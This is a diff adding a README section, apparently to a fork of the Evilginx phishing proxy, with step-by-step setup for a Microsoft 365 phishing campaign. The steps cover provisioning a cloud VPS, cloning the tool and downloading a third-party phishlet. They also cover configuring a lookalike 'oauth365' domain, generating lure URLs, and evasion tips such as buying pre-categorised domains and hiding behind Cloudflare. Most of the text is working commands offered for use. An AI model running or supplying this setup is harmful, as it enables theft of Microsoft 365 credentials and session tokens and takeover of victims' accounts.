@@ -1,3 +1,89 @@
+# Note You can use the author's script below which is faster and quick.
+
+Evilginx Setup Telegram Result Notification 
+
+First categorize your domain as a business or tech company...or buy an already categorized domain from dyn
+
+Try FortiGuard.com
+
+
+ssh -i "rdpkeyforawsec2.pem" ubuntu@x.x.x.x.x.us-west-2.compute.amazonaws.com
+
+cd /root
+
+# Update ubuntu
+sudo apt update
+sudo apt upgrade -y 
+
+# install tools
+sudo apt install wget make git -y 
+
+# Stop dns resolver
+sudo systemctl stop systemd-resolved
+
+sudo nano /etc/resolv.conf
+
+You should have nameserver 127.0.0.53 there. Comment that out and add your preferred DNS servers to the list:
+
+nameserver 127.0.0.53
+nameserver 1.1.1.1
+nameserver 1.0.0.2
+As an example, the nameserver information should look like this:
+
+
+sudo nano /etc/hosts
+
+Add 127.0.1.1 yourMachineName under 127.0.0.1, like this
+127.0.0.1 localhost
+127.0.1.1 webapp-evilginx
+
+after these steps reboot your vps or machine before you continue.
+
+
+
+# Download Go tarball
+wget https://go.dev/dl/go1.22.3.linux-amd64.tar.gz
+
+# Extract packages to /usr/local
+sudo tar -zxvf go1.22.3.linux-amd64.tar.gz -C /usr/local/
+
+
+
+echo "export PATH=/usr/local/go/bin:${PATH}" | sudo tee /etc/profile.d/go.sh
+
+source /etc/profile.d/go.sh
+
+
+# Clone and compile from source
+git clone https://github.com/fluxxset/evilginx2.git
+cd evilginx2 
+
+chmod +x evilginx2
+
+./evilginx2
+
+# Our Phishlet
+sudo wget https://raw.githubusercontent.com/user-user-user/phishlets/refs/heads/main/phishlet365.yaml -P /root/evilginx2/phishlets
+
+
+Note: If you start your evilginx and get ... exit, and run sudo nano /root/.evilginx/config.json and change the dns port from port 53 to port 5300. and restart your evilginx.
+
+
+config domain oauth365-v2auth-sso.domain.org
+config ipv4 external 44.1.1.111
+
+
+phishlets hostname microsoft365 oauth365-v2auth-sso.domain.org
+phishlets enable microsoft365
+
+
+lures create microsoft365
+
+lures get-url 0
+
+Use cloudflare to secure your site..
+
+
 # Evilginx 3.0
 ```
 - git clone https://github.com/fluxxset/evilginx2.git
